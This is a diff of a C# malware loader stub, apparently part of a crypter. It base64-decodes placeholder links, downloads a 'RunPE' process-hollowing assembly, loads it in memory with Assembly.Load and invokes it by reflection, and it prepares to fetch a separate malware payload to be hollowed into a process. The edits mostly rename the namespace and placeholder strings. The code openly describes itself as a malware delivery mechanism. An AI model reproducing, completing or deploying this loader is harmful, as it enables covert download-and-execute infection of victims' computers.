@@ -5,7 +5,7 @@ using System.Text;
 
 
 
-namespace Runpereversed
+namespace Stub
 {
 
 	internal static partial class Program
@@ -21,7 +21,7 @@ namespace Runpereversed
 			WebClient webClient = new WebClient();
 
 
-			string rawww = Encoding.UTF8.GetString(Convert.FromBase64String("RUNPE link"));
+			string rawww = Encoding.UTF8.GetString(Convert.FromBase64String("Runpe Process Hollowing Direct Link Base64 Encode"));
 
 			byte[] ByrawAssembly = webClient.DownloadData(rawww);
 
@@ -29,7 +29,7 @@ namespace Runpereversed
 
 			WebClient webClient2 = new WebClient();
 
-			string asdasdasdas = Encoding.UTF8.GetString(Convert.FromBase64String("HOLLOWİNG m@lware Links"));
+			string asdasdasdas = Encoding.UTF8.GetString(Convert.FromBase64String("Hollowing File or Malware link"));
 
 			Uri address = new Uri(asdasdasdas);
 
@@ -43,8 +43,8 @@ namespace Runpereversed
 			};
 			string target = null;
 			Assembly assembly = Assembly.Load(ByrawAssembly);
-			assembly.GetType("PROJEADI.CLASSNAME").InvokeMember("RUNMETHODU", BindingFlags.InvokeMethod, null, target, (object[])obj);
-			WebClient wc = new WebClient();
+			assembly.GetType("Projectname.Classname").InvokeMember("RunMethodName", BindingFlags.InvokeMethod, null, target, (object[])obj);
+			
 
 
 
